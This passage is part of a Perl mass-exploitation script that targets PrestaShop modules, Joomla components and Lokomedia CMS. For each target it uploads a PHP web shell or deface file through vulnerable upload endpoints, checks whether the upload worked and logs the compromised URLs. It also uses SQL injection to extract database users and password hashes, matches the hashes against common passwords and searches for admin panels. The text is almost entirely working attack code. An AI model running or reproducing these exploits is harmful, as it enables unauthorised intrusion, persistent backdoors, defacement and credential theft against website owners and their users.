print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $pk_flexmenuup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="files/Izanami.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/Izanami.php?I=Xploit";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $pk_vertflexmenuup\n";

open (TEXT, '>>Result/Shell.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="files/nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?I=Xploit";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $nvn_export_ordersup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=Izanami.php";
my $shell ="files/Izanami.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/Izanami.php.png?I=Xploit";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $megamenuup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="files/Izanami.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/Izanami.php?I=Xploit";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="files/Izanami.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/Izanami.php?I=Xploit";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold red'),"FAILED\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="files/Izanami.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/Izanami.php?I=Xploit";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"masseditproduct";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $masseditproductup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"masseditproduct";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ blocktestimonial #####################
sub blocktestimonial(){
my $url = "$site/modules/blocktestimonial/addtestimonial.php";


my $response = $ua->post( $url,
            testimonial_submitter_name => "indoxploit",
            testimonial_title => "hacked by indoxploit",
            testimonial_main_message => "hacked by indoxploit",			
            testimonial_img => "files/Izanami.php",
            testimonial => "Submit Testimonial"			
           
            );
$blocktestimonialup="$site/upload/Izanami.php?I=Xploit";

my $checkblocktestimonial = $ua->get("$blocktestimonialup")->content;
if($checkblocktestimonial =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"blocktestimonial";
print color('bold white')," ............. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $blocktestimonialup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$blocktestimonialup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"blocktestimonial";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
################ Jexboss #####################
sub jexboss(){
system("python files/jexboss.py $site");
}

################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ";
print color('bold red'),"NOT FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
  print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"URL : $pathone\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOT FOUND\n";
}
}

################################################################
#                                                              #     
#                            JOOMLA                            # 
#                                                              #                                                                
################################################################

################ Version #####################
sub versij(){

my $url = "$site/language/en-GB/en-GB.xml";
my $checkomusersc = $ua->get("$url")->content;

if($checkomusersc =~/<version>(.*)</) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Joomla Version";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold white'),"$1";
print color('bold white'),"\n";
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
open (TEXT, '>>Cms/version.txt');
print TEXT "joom => $site => $1\n";
close (TEXT);
}

sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


my $jceurl="$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

my $res = $ua->post($jceurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["files/Izanami.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$jceup= "$site/Izanami.gif";
$check = $ua->get($jceup)->status_line;
if ($check =~ /200/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jce";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold yellow')," [";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold green'),"Upload File Deface Succes\n";
print color('bold green'),"  URL => $jceup\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$jceup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jce";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&Resultl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="files/Izanami.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/Izanami.txt";

$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/HaCKeD/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Media";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  SHELL => $mediaup\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$mediaup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Media";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}


################ comjdownloads #####################
sub comjdownloads(){
$file="files/Jattack.rar";
$filez="files/Izanami.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/Izanami.php.j?I=Xploit';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Hiruka Minami", mail=>"ternakayam333@gmail.com", filetitle =>"Hiruka Minami xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $shellpath\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
comjdownloadsdef();
}
}


################ comjdownloads index #####################
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/Izanami.html.j';
$filee="files/Jattack.rar";
$filezz="files/Izanami.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Hiruka Minami", mail=>"ternakayam333@gmail.com", filetitle =>"Hiruka Minami xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold green'),"  SHELL => $def\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$def\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
        }
}
else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Jdownloads Index";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";

}
}

################ comfabrik #####################
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="files/Izanami.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/Izanami.php?I=Xploit";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/Izanami Xploit/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $comfabrikupp\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
  comfabrikdef();
}
}

################ comfabrik index #####################
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="files/Izanami.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/Izanami.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/HaCKeD/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  SHELL => $comfabrikup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik Index";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ Com Media #####################
sub comfabi2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $inn ="files/Izanami.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$inn"] ]
           
            );

$mediauph="$site/Izanami.php?I=Xploit";

$checkpofwuph = $ua->get("$mediauph")->content;
if($checkpofwuph =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik2 Shell";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $mediauph\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$mediauph\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik2";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ comfabrik index2 #####################
sub comfabrikdef2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $index ="files/Izanami.txt";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$index"]]
           
            );

$comfabrikup2="$site/Izanami.txt";

$checkcomfabrikup = $ua->get("$comfabrikup2")->content;
if($checkcomfabrikup =~/HaCKeD/) {

print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik Index2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  SHELL => $comfabrikup2\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$comfabrikup2\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Fabrik2 Index";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}

################ foxcontact #####################
sub foxfind(){


$foxup="$site/components/com_foxcontact/js/fileuploader.js";

my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /upload/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"FOUND\n";
fox2();
open (TEXT, '>>Result/Foxcontact.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"NOT FOUND\n";
}
}
################ foxcontact #####################
sub foxcontact(){

@foxOK= ("components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php",
"index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php",
"components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php");
OUTER: foreach $foxOK(@foxOK){
chomp $foxOK;

my $url = "$site/$foxOK";

my $shell ="files/Izanami.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$foxup="$site/components/com_foxcontact/_func.php?I=Xploit.php";
}
my $checkfoxup = $ua->get("$foxup")->content;
if ($checkfoxup =~ /Izanami/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
